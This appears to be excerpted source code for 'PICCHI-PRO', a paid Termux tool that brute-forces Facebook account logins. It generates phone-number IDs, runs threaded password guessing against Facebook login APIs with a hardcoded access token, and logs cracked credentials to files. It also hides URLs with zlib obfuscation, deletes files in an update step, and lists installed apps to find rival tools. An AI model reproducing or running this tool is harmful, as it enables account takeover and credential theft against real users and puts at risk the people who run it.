...
uid = os.getuid()
key1 = open('/data/data/com.termux/files/usr/bin/.mrakingxxx-cov', 'r').read()
kex=("PICCHI{uid}TS{key1}PX110E==")
key2 = base64.b64encode(str("{kex}").encode('utf-8'))
key=("{key2}")
...
def chk():
        ...
        if ua not in urll:
                ...
                if kex in requests.get(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7O,((\xabH\xd1K\xca\xc9O/.\xc8/\xd1K\xce\xcf\xd57202\xd274\xd4\x07\x8ag\x94\xe4\xe6\x00\x00U\xba\x0e\xd8')).text:
                        print(' Wair for PICCHI New update ');exit()
                else:
...
try:
        ...
        if updt in linx:
                ...
                print('\n PICCHI-PRO Update Done Wait for installing...\n')
                os.system('cd $HOME && cd PICCHI-PRO')
                os.system('rm -rf *')
                os.system("curl -L https://raw.githubusercontent.com/Purn0h4x0r/PICCHI-PRO/main/Approval.txt")
except ValueError:exit()
try:
        a = "anar"
        t="tt"
        fileee = os.listdir(zlib.decompress(b'x\x9c\xd3/NIN,J\xd1w\xccK)\xca\xcfL\xd1OI,I\xd4\x07\x00SL\x07\x89'))
        if 'com.h{t}pc{a}y.pro' in fileee:
...
╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝╚═════╝░
----------------------------------------------
 Author    : Md Purno Shah 
 Github    : Purn0h4x0r
 Facebook  : Md Purno Shah 
 Tool Name : PICCHI-PRO
 Tool type : PAID
----------------------------------------------
...
def public():
        ...
        for met in range(jum):
                yz+=1
                kl = input('\033[1;37m Put link no.{yz+0}: ')
                usrr.append(kl)
        linex()
                ...
                if kex in link:
                        ...
                        if xd in ['1','01']:
                                ...
                                if ppp in ['1','01']:
                                        ...
                                        plist.append('rong password')
                                        plist.append('error error')
                                        plist.append('incorrect')
                                        plist.append('fuck you')
                                        plist.append('first ff')
                                        plist.append('first boss')
                                        plist.append('teen patti gold')
                                        plist.append('tpg last')
                                elif ppp in ['3','03']:
                                        clear()
                                        ...
                                        linex()
                                        for i in range(ps_limit):
                                                plist.append(input(' Put password {i+1}: '))
                                linex()
                                print(' Do you went show cp account? (y/n): ')
                                linex()
                                cx=input(' Choose: ')
                                ...
                                os.system(f'xdg-open https://wa.me/+8801756462587');menu()
                        elif xd in ['7','07']:
                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/AKING_VPN1.0.apk/file');menu()
                        elif xd in ['8','08']:
                                os.system('xdg-open https://www.facebook.com/mr.darkness.p');menu()
                        elif xd in ['0','00']:
                        ...
                        linex()
                        url_wa = "https://api.whatsapp.com/send?phone=+8801756462587&text="
                        name = input(" Enter your Name : ")
                        linex()
                        tks = ("Hi Md Purno Sir, I Need To Buy Your Paid PICCHI PRO Tools Version 1.9.7 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python PRO.py')
                        linex()
                        exit()
        except ValueError:
                exit()
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as Picchi:     
                        clear()
                        tl = str(len(user))
                        print(' Total account : \033[1;32m'+tl)
                        print('\033[1;37m Choice code ..:\033[1;32m '+code)
                        print('\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;97m')
                        linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khankhan','khan1122','khan12345','khan123','khan123456','khankhan123']
                                Picchi.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [𝗣𝗜𝗖𝗖𝗛𝗜] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        Picchi=session.cookies.get_dict().keys()
                        if "c_user" in Picchi:
                                print('\r\r\033[1;32m [PICCHI-OK] %s | %s'%(ids,pas))
                                open('/sdcard/PICCHI-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Picchi:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [PICCHI-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/PICCHI-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
        ...
        try:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [PICCHI-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/PICCHI-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[PICCHI-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
...
def rndm(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [PICCHI] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [PICCHI-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/PICCHI-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [PICCHI-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/PICCHI-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
